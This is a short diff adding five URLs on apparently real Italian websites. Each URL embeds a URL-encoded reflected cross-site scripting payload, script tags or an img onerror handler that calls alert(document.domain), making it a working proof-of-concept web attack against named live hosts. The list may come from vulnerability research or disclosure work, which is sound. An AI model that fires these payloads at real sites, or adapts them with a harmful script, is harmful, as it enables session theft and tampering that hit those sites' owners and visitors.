@@ -1,0 +1,5 @@
+http://albertoguerra.it/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://arwio.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://asmecal.it/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://asusroma.it/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+https://asem.it/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
